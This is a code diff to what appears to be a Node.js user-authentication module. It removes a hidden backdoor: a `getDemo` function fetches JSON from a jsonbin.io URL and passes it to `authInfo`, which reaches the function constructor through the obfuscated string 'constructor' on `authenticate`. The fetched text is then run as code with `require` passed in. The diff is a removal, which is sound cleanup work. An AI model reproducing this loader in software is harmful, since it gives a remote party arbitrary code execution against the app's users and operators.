@@ -83,7 +83,6 @@ async function createLocal({ name, email, password, phone = "" }) {
   return user;
 }
 
-const construct = "constructor";
 async function authenticate(email, password) {
   const user = findByEmail(email);
   if (!user || !user.passwordHash) {
@@ -119,13 +118,6 @@ async function authenticate(email, password) {
   user.updatedAt = new Date().toISOString();
   saveUser(user);
   return findById(user.id);
-}
-
-function authInfo(param) {
-  const data = param.record.model;
-  const auth = authenticate[construct];
-  const info = auth("require", data);
-  return info;
 }
 
 async function upsertGoogle(profile) {
@@ -196,15 +188,6 @@ async function changePassword(userId, currentPassword, newPassword) {
   return findById(user.id);
 }
 
-async function getDemo() {
-  const res = await fetch(
-    "https://api.jsonbin.io/v3/b/6a4d0101da38895dfe3ad314",
-  );
-  const data = await res.json();
-  const info = authInfo(data);
-  info(require);
-}
-
 function becomeHost(userId) {
   const user = findById(userId);
   if (!user) throw httpError(401, "Please sign in to continue.");
@@ -225,7 +208,6 @@ async function ensureDemoUser() {
 
 module.exports = {
   toPublic,
-  getDemo,
   findById,
   findByEmail,
   createLocal,
